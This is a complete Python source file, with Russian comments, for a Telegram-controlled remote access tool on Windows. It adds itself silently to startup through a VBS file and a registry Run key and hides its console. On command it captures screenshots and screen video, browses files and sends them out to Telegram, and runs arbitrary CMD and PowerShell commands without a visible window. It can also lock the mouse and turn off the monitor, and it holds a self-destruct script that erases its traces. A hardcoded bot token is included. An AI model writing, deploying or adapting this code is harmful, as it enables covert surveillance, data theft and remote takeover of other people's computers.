# -*- coding: utf-8 -*-
"""
PC Manager - ПОЛНАЯ ВЕРСИЯ + АВТОУСТАНОВКА
Скрины, видео, процессы, IP, файлы, терминал, мышь, монитор, мульти-ПК, самоудаление
"""

import subprocess
import sys
import pkg_resources
from pkg_resources import DistributionNotFound, VersionConflict
import os
import time
import ctypes
import threading

# ==================== АВТОУСТАНОВКА БИБЛИОТЕК ====================
REQUIRED_LIBS = [
    'pytelegrambotapi',
    'pyautogui',
    'psutil',
    'opencv-python',
    'numpy',
    'pillow',
    'pynput'
]

def install_and_import(package):
    try:
        pkg_resources.get_distribution(package)
        print(f"✅ {package} уже установлен")
        return True
    except (DistributionNotFound, VersionConflict):
        print(f"📦 Устанавливаю {package}...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "-q", package])
            print(f"✅ {package} установлен")
            return True
        except:
            print(f"❌ Ошибка установки {package}")
            return False

print("🔄 Проверка библиотек...")
missing_libs = []
for lib in REQUIRED_LIBS:
    if not install_and_import(lib):
        missing_libs.append(lib)

if missing_libs:
    print(f"❌ Критическая ошибка: не удалось установить: {', '.join(missing_libs)}")
    input("Нажми Enter для выхода...")
    sys.exit(1)

print("✅ Все библиотеки загружены, запускаю бота...\n")

# ==================== ИМПОРТЫ ====================
import telebot
import pyautogui
import psutil
import cv2
import numpy as np
from PIL import ImageGrab
from pynput.mouse import Controller, Listener
from telebot import types
import socket
from datetime import datetime
import io

# ==================== ТВОИ ДАННЫЕ ====================
TOKEN = "8217792391:AAG8vayD-eggw9yAECVItIeH6RpT9JyiT_o"
YOUR_TELEGRAM_ID = 8580520705
PC_NAME = socket.gethostname()

# ==================== ИНИЦИАЛИЗАЦИЯ ====================
bot = telebot.TeleBot(TOKEN)

# Для блокировки мыши
mouse = Controller()
block_mouse = False

# Хранилище выбранного ПК
user_selected_pc = {}

# Для файлового менеджера
current_dir = os.path.expanduser("~")

# ==================== ПРОВЕРКА ВИДЕО ====================
VIDEO_AVAILABLE = True  # теперь точно есть

def is_owner(message):
    return message.from_user.id == YOUR_TELEGRAM_ID

def should_execute(message):
    target = user_selected_pc.get(message.from_user.id, "all")
    return target == "all" or target == PC_NAME

# ==================== БЛОКИРОВКА МЫШИ ====================
def mouse_blocker():
    def on_move(x, y):
        if block_mouse:
            mouse.position = (0, 0)
            return False
        return True
    
    while True:
        if block_mouse:
            with Listener(on_move=on_move) as listener:
                listener.join()
        time.sleep(0.1)

threading.Thread(target=mouse_blocker, daemon=True).start()

# ==================== АВТОЗАГРУЗКА ====================
def add_to_startup():
    try:
        current_file = __file__
        startup_folder = os.environ['APPDATA'] + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        vbs_content = f'CreateObject("Wscript.Shell").Run "pythonw \"{current_file}\"", 0, False'
        vbs_path = startup_folder + "\\pc_bot.vbs"
        
        if not os.path.exists(vbs_path):
            with open(vbs_path, 'w') as f:
                f.write(vbs_content)
            
            reg_path = 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'
            reg_name = 'PCManagerBot'
            reg_value = f'pythonw "{current_file}"'
            subprocess.run(f'reg add "{reg_path}" /v "{reg_name}" /t REG_SZ /d "{reg_value}" /f', 
                         shell=True, capture_output=True)
    except:
        pass

add_to_startup()

# ==================== МЕНЮ ====================

def main_menu():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    
    buttons = [
        types.KeyboardButton('📸 Скриншот'),
        types.KeyboardButton('🎥 Видео 5с'),
        types.KeyboardButton('📋 Процессы'),
        types.KeyboardButton('📡 IP'),
        types.KeyboardButton('📁 Показать файлы'),
        types.KeyboardButton('📂 Перейти'),
        types.KeyboardButton('📥 Скачать'),
        types.KeyboardButton('💻 Команда CMD'),
        types.KeyboardButton('⚡ PowerShell'),
        types.KeyboardButton('🖥️ Моник выкл'),
        types.KeyboardButton('🖥️ Моник вкл'),
        types.KeyboardButton('🔒 Блок мыши'),
        types.KeyboardButton('🔓 Разблок мыши'),
        types.KeyboardButton('🗑️ Удалить этот ПК'),
        types.KeyboardButton('🎯 Выбрать ПК'),
        types.KeyboardButton('❓ Помощь'),
        types.KeyboardButton('💣 Самоуничтожение')
    ]
    
    markup.add(*buttons)
    return markup

def pc_selection_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn_all = types.InlineKeyboardButton("🌐 ВСЕ ПК", callback_data="pc_all")
    btn_this = types.InlineKeyboardButton(f"💻 {PC_NAME}", callback_data=f"pc_{PC_NAME}")
    markup.add(btn_all, btn_this)
    return markup

# ==================== СТАРТ ====================

@bot.message_handler(commands=['start'])
def start(message):
    if not is_owner(message):
        return
    bot.send_message(message.chat.id, 
                    f"✅ **PC Manager FULL + AutoLibs**\n\n"
                    f"💻 **ПК:** `{PC_NAME}`\n"
                    f"🎯 **Текущая цель:** `{user_selected_pc.get(message.from_user.id, 'Все ПК')}`", 
                    parse_mode='Markdown', 
                    reply_markup=main_menu())

@bot.message_handler(commands=['setpc'])
def setpc(message):
    if not is_owner(message):
        return
    bot.send_message(message.chat.id, 
                    "🎯 **Выбери ПК:**",
                    parse_mode='Markdown',
                    reply_markup=pc_selection_menu())

@bot.message_handler(commands=['listpc'])
def listpc(message):
    if not is_owner(message):
        return
    current = user_selected_pc.get(message.from_user.id, "all")
    current_text = "Все ПК" if current == "all" else current
    bot.send_message(message.chat.id, 
                    f"📋 **Доступные ПК:**\n\n"
                    f"💻 **{PC_NAME}** (текущий)\n"
                    f"🎯 **Текущая цель:** {current_text}",
                    parse_mode='Markdown',
                    reply_markup=pc_selection_menu())

# ==================== СКРИНШОТ ====================

@bot.message_handler(commands=['screen'])
def screen(message):
    if not is_owner(message) or not should_execute(message):
        return
    try:
        bot.send_chat_action(message.chat.id, 'upload_photo')
        img = pyautogui.screenshot()
        bio = io.BytesIO()
        img.save(bio, 'JPEG', quality=70)
        bio.seek(0)
        bot.send_photo(message.chat.id, bio, 
                      caption=f"🖥️ **{PC_NAME}**",
                      parse_mode='Markdown',
                      reply_markup=main_menu())
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка: {e}")

# ==================== ВИДЕО ====================

@bot.message_handler(commands=['v'])
def video(message):
    if not is_owner(message) or not should_execute(message):
        return
    
    try:
        sec = 5
        
        if message.text.startswith('/v'):
            parts = message.text.split()
            if len(parts) > 1:
                try:
                    sec = int(parts[1])
                except:
                    sec = 5
        
        if sec < 2: sec = 2
        if sec > 10: sec = 10
        
        msg = bot.send_message(message.chat.id, f"🎥 Запись {sec} сек...")
        
        frames = []
        fps = 2
        total_frames = sec * fps
        
        for i in range(total_frames):
            frame = np.array(ImageGrab.grab())
            frame = cv2.resize(frame, (640, 360))
            frames.append(frame)
            
            if i % fps == 0:
                progress = i // fps
                bot.edit_message_text(f"🎥 Запись... {progress}/{sec}", 
                                     message.chat.id, msg.message_id)
            time.sleep(0.5)
        
        temp = os.environ['TEMP'] + f"\\video_{int(time.time())}.mp4"
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        out = cv2.VideoWriter(temp, fourcc, fps, (640, 360))
        
        for frame in frames:
            out.write(cv2.cvtColor(frame, cv2.COLOR_RGB2BGR))
        out.release()
        
        bot.delete_message(message.chat.id, msg.message_id)
        
        with open(temp, 'rb') as f:
            bot.send_video(message.chat.id, f, 
                          caption=f"🎥 {sec} сек",
                          reply_markup=main_menu())
        
        os.remove(temp)
        
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка видео: {e}")

# ==================== ПРОЦЕССЫ ====================

@bot.message_handler(commands=['ps'])
def processes(message):
    if not is_owner(message) or not should_execute(message):
        return
    try:
        procs = []
        for p in psutil.process_iter(['name', 'cpu_percent']):
            try:
                if p.info['cpu_percent'] and p.info['cpu_percent'] > 1:
                    procs.append(f"• {p.info['name']} ({p.info['cpu_percent']:.0f}%)")
            except:
                continue
        
        if procs:
            procs.sort(key=lambda x: float(x.split('(')[1].split('%')[0]), reverse=True)
            bot.send_message(message.chat.id, 
                           "\n".join(procs[:10]), 
                           reply_markup=main_menu())
        else:
            bot.send_message(message.chat.id, "📋 Нет активных процессов", 
                           reply_markup=main_menu())
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка: {e}")

# ==================== IP ====================

@bot.message_handler(commands=['ip'])
def ip(message):
    if not is_owner(message) or not should_execute(message):
        return
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
        s.close()
        bot.send_message(message.chat.id, 
                       f"📡 IP: {ip}", 
                       reply_markup=main_menu())
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка: {e}")

# ==================== УПРАВЛЕНИЕ МОНИТОРОМ ====================

@bot.message_handler(commands=['monitor_off'])
def monitor_off(message):
    if not is_owner(message) or not should_execute(message):
        return
    try:
        ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
        bot.send_message(message.chat.id, 
                       f"🖥️ Монитор выключен", 
                       reply_markup=main_menu())
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка: {e}")

@bot.message_handler(commands=['monitor_on'])
def monitor_on(message):
    if not is_owner(message) or not should_execute(message):
        return
    try:
        pyautogui.moveRel(1, 0)
        pyautogui.moveRel(-1, 0)
        bot.send_message(message.chat.id, 
                       f"🖥️ Монитор включен", 
                       reply_markup=main_menu())
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка: {e}")

# ==================== БЛОКИРОВКА МЫШИ ====================

@bot.message_handler(commands=['lock_mouse'])
def lock_mouse(message):
    if not is_owner(message) or not should_execute(message):
        return
    global block_mouse
    block_mouse = True
    mouse.position = (0, 0)
    bot.send_message(message.chat.id, 
                   f"🔒 Мышь заблокирована", 
                   reply_markup=main_menu())

@bot.message_handler(commands=['unlock_mouse'])
def unlock_mouse(message):
    if not is_owner(message) or not should_execute(message):
        return
    global block_mouse
    block_mouse = False
    bot.send_message(message.chat.id, 
                   f"🔓 Мышь разблокирована", 
                   reply_markup=main_menu())

# ==================== УДАЛЕННЫЙ ТЕРМИНАЛ ====================

@bot.message_handler(commands=['cmd'])
def remote_cmd(message):
    if not is_owner(message) or not should_execute(message):
        return
    
    command = message.text[5:].strip()
    
    if not command:
        bot.send_message(message.chat.id, 
                        "📝 **Введи команду CMD:**\n"
                        "`/cmd ipconfig` - сетевые настройки\n"
                        "`/cmd dir` - список файлов",
                        parse_mode='Markdown')
        return
    
    try:
        msg = bot.send_message(message.chat.id, f"⚙️ **CMD:** `{command}`", parse_mode='Markdown')
        
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            encoding='cp866',
            errors='ignore',
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        try:
            stdout, stderr = process.communicate(timeout=30)
        except subprocess.TimeoutExpired:
            process.kill()
            bot.edit_message_text("❌ **Команда выполнялась слишком долго**", 
                                message.chat.id, msg.message_id, parse_mode='Markdown')
            return
        
        result = ""
        if stdout:
            result += f"📤 **Вывод:**\n```\n{stdout[:2500]}\n```\n"
        if stderr:
            result += f"⚠️ **Ошибки:**\n```\n{stderr[:500]}\n```\n"
        
        if not result:
            result = "✅ **Команда выполнена (вывода нет)**"
        
        if process.returncode != 0:
            result += f"\n🔚 **Код возврата:** `{process.returncode}`"
        
        bot.edit_message_text(result, message.chat.id, msg.message_id, parse_mode='Markdown')
        
    except Exception as e:
        bot.edit_message_text(f"❌ **Ошибка:** `{str(e)}`", message.chat.id, msg.message_id, parse_mode='Markdown')

@bot.message_handler(commands=['ps1'])
def remote_powershell(message):
    if not is_owner(message) or not should_execute(message):
        return
    
    command = message.text[5:].strip()
    
    if not command:
        bot.send_message(message.chat.id, 
                        "📝 **PowerShell команда:**\n"
                        "`/ps1 Get-Process` - список процессов",
                        parse_mode='Markdown')
        return
    
    try:
        msg = bot.send_message(message.chat.id, f"⚙️ **PowerShell:** `{command}`", parse_mode='Markdown')
        
        process = subprocess.Popen(
            ['powershell.exe', '-Command', command],
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            encoding='utf-8',
            errors='ignore',
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        try:
            stdout, stderr = process.communicate(timeout=30)
        except subprocess.TimeoutExpired:
            process.kill()
            bot.edit_message_text("❌ **Команда выполнялась слишком долго**", 
                                message.chat.id, msg.message_id, parse_mode='Markdown')
            return
        
        result = ""
        if stdout:
            result += f"📤 **Вывод:**\n```\n{stdout[:2500]}\n```\n"
        if stderr:
            result += f"⚠️ **Ошибки:**\n```\n{stderr[:500]}\n```\n"
        
        if not result:
            result = "✅ **Команда выполнена**"
        
        bot.edit_message_text(result, message.chat.id, msg.message_id, parse_mode='Markdown')
        
    except Exception as e:
        bot.edit_message_text(f"❌ **Ошибка:** `{str(e)}`", message.chat.id, msg.message_id, parse_mode='Markdown')

# ==================== УДАЛЕНИЕ ПК ====================

@bot.message_handler(commands=['removepc'])
def removepc(message):
    if not is_owner(message) or not should_execute(message):
        return
    
    markup = types.InlineKeyboardMarkup()
    btn_yes = types.InlineKeyboardButton("✅ ДА, УДАЛИТЬ", callback_data=f"remove_yes")
    btn_no = types.InlineKeyboardButton("❌ ОТМЕНА", callback_data="remove_no")
    markup.add(btn_yes, btn_no)
    
    bot.send_message(message.chat.id, 
                    f"⚠️ **Удалить этот ПК из списка?**\n"
                    f"После удаления бот перестанет отвечать с этого ПК.\n\n"
                    f"💻 ПК: `{PC_NAME}`",
                    parse_mode='Markdown',
                    reply_markup=markup)

# ==================== САМОУНИЧТОЖЕНИЕ ====================

@bot.message_handler(commands=['selfdestruct'])
def selfdestruct(message):
    if not is_owner(message) or not should_execute(message):
        return
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = types.KeyboardButton('✅ ДА, УДАЛИТЬ')
    btn2 = types.KeyboardButton('❌ НЕТ, ОТМЕНА')
    markup.add(btn1, btn2)
    
    bot.send_message(message.chat.id, 
                    f"💣 **Удалить бота на {PC_NAME}?**\n"
                    "Это удалит файл и все следы!",
                    parse_mode='Markdown',
                    reply_markup=markup)

def self_destruct_complete(message):
    try:
        current_file = __file__
        current_dir_path = os.path.dirname(current_file)
        startup_folder = os.environ['APPDATA'] + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        temp_folder = os.environ['TEMP']
        
        bat_content = f"""@echo off
taskkill /f /im python.exe >nul 2>&1
taskkill /f /im pythonw.exe >nul 2>&1
del /f /q "{startup_folder}\\pc_bot.vbs" >nul 2>&1
reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "PCManagerBot" /f >nul 2>&1
del /f /q "{current_file}" >nul 2>&1
del /f /q "{temp_folder}\\*.mp4" >nul 2>&1
rmdir "{current_dir_path}" >nul 2>&1
del /f /q "%~f0" >nul 2>&1
"""
        
        bat_path = temp_folder + "\\remove.bat"
        with open(bat_path, 'w', encoding='cp1251') as f:
            f.write(bat_content)
        
        bot.send_message(message.chat.id, f"✅ **ПК {PC_NAME} удалён!**")
        time.sleep(2)
        subprocess.Popen(['cmd', '/c', 'start', '/min', bat_path], 
                        shell=True, 
                        creationflags=subprocess.CREATE_NO_WINDOW)
        
        bot.stop_polling()
        sys.exit(0)
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка: {e}")

# ==================== ФАЙЛЫ ====================

@bot.message_handler(commands=['ls'])
def list_files(message):
    if not is_owner(message) or not should_execute(message):
        return
    
    global current_dir
    
    try:
        if not os.path.exists(current_dir):
            current_dir = os.path.expanduser("~")
        
        text = f"📁 **{current_dir}**\n\n"
        
        folders = []
        files = []
        
        for item in os.listdir(current_dir):
            item_path = os.path.join(current_dir, item)
            try:
                if os.path.isdir(item_path):
                    folders.append(f"📁 {item}")
                else:
                    size = os.path.getsize(item_path)
                    if size < 1024:
                        size_str = f"{size} B"
                    elif size < 1024*1024:
                        size_str = f"{size/1024:.1f} KB"
                    else:
                        size_str = f"{size/(1024*1024):.1f} MB"
                    files.append(f"📄 {item} ({size_str})")
            except:
                continue
        
        if folders:
            text += "**Папки:**\n" + "\n".join(folders[:10]) + "\n\n"
        if files:
            text += "**Файлы:**\n" + "\n".join(files[:15]) + "\n"
        
        bot.send_message(message.chat.id, text, parse_mode='Markdown', reply_markup=main_menu())
        
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка: {e}")

@bot.message_handler(commands=['cd'])
def change_dir(message):
    if not is_owner(message) or not should_execute(message):
        return
    
    global current_dir
    
    path = message.text[4:].strip()
    if not path:
        bot.send_message(message.chat.id, "📝 Пример: /cd Desktop")
        return
    
    try:
        if path == "..":
            new_path = os.path.dirname(current_dir)
        elif os.path.isabs(path):
            new_path = path
        else:
            new_path = os.path.join(current_dir, path)
        
        new_path = os.path.abspath(new_path)
        
        if os.path.exists(new_path) and os.path.isdir(new_path):
            current_dir = new_path
            bot.send_message(message.chat.id, f"✅ {new_path}", reply_markup=main_menu())
        else:
            bot.send_message(message.chat.id, "❌ Папка не найдена")
            
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка: {e}")

@bot.message_handler(commands=['download'])
def download_file(message):
    if not is_owner(message) or not should_execute(message):
        return
    
    filename = message.text[9:].strip()
    if not filename:
        bot.send_message(message.chat.id, "📝 Пример: /download file.txt")
        return
    
    try:
        file_path = os.path.join(current_dir, filename)
        
        if not os.path.exists(file_path):
            bot.send_message(message.chat.id, "❌ Файл не найден")
            return
        
        if os.path.isdir(file_path):
            bot.send_message(message.chat.id, "❌ Это папка")
            return
        
        size = os.path.getsize(file_path) / (1024 * 1024)
        if size > 45:
            bot.send_message(message.chat.id, f"❌ Файл слишком большой ({size:.1f} МБ)")
            return
        
        with open(file_path, 'rb') as f:
            bot.send_document(message.chat.id, f, caption=f"📥 {filename}", reply_markup=main_menu())
            
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка: {e}")

# ==================== ОБРАБОТЧИКИ КНОПОК ====================

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    if not is_owner(call.message):
        return
    
    if call.data.startswith("pc_"):
        pc_name = call.data[3:]
        user_selected_pc[call.from_user.id] = pc_name
        text = "🌐 Все ПК" if pc_name == "all" else f"💻 {pc_name}"
        bot.answer_callback_query(call.id, f"Цель: {text}")
        bot.edit_message_text(f"🎯 **Цель: {text}**", call.message.chat.id, call.message.message_id, parse_mode='Markdown')
        bot.send_message(call.message.chat.id, "Меню:", reply_markup=main_menu())
    
    elif call.data == 'remove_yes':
        bot.edit_message_text(f"✅ **ПК {PC_NAME} удалён из списка**\nБот больше не будет отвечать.",
                            call.message.chat.id,
                            call.message.message_id,
                            parse_mode='Markdown')
        bot.stop_polling()
        sys.exit(0)
    
    elif call.data == 'remove_no':
        bot.edit_message_text("❌ Удаление отменено",
                            call.message.chat.id,
                            call.message.message_id,
                            parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text and not message.text.startswith('/'))
def handle_buttons(message):
    if not is_owner(message):
        return
    
    text = message.text
    
    if text == '📸 Скриншот':
        screen(message)
    elif text == '🎥 Видео 5с':
        message.text = '/v 5'
        video(message)
    elif text == '📋 Процессы':
        processes(message)
    elif text == '📡 IP':
        ip(message)
    elif text == '📁 Показать файлы':
        list_files(message)
    elif text == '📂 Перейти':
        bot.send_message(message.chat.id, "📝 /cd Desktop\n/cd ..\n/cd C:\\")
    elif text == '📥 Скачать':
        bot.send_message(message.chat.id, "📝 /download file.txt")
    elif text == '💻 Команда CMD':
        bot.send_message(message.chat.id, "📝 Введи: /cmd ipconfig")
    elif text == '⚡ PowerShell':
        bot.send_message(message.chat.id, "📝 Введи: /ps1 Get-Process")
    elif text == '🖥️ Моник выкл':
        monitor_off(message)
    elif text == '🖥️ Моник вкл':
        monitor_on(message)
    elif text == '🔒 Блок мыши':
        lock_mouse(message)
    elif text == '🔓 Разблок мыши':
        unlock_mouse(message)
    elif text == '🗑️ Удалить этот ПК':
        removepc(message)
    elif text == '🎯 Выбрать ПК':
        setpc(message)
    elif text == '💣 Самоуничтожение':
        selfdestruct(message)
    elif text == '❓ Помощь':
        help_text = "📸 /screen - скрин\n"
        help_text += "🎥 /v 5 - видео\n"
        help_text += "📋 /ps - процессы\n📡 /ip - IP\n📁 /ls - файлы\n📂 /cd - переход\n📥 /download - скачать\n"
        help_text += "💻 /cmd - CMD\n⚡ /ps1 - PowerShell\n"
        help_text += "🖥️ /monitor_off/on - монитор\n🔒 /lock/unlock_mouse - мышь\n"
        help_text += "🗑️ /removepc - удалить этот ПК\n🎯 /setpc - выбор ПК\n💣 /selfdestruct - самоуничтожение"
        bot.send_message(message.chat.id, help_text, reply_markup=main_menu())

# ==================== ЗАПУСК ====================

if __name__ == '__main__':
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass
    
    print("=" * 50)
    print("✅ PC MANAGER FULL + AUTOLIBS - ЗАПУЩЕН")
    print(f"💻 ПК: {PC_NAME}")
    print("=" * 50)
    
    while True:
        try:
            bot.infinity_polling(timeout=30, long_polling_timeout=20)
        except Exception as e:
            print(f"⚠️ Ошибка: {e}")
            time.sleep(10)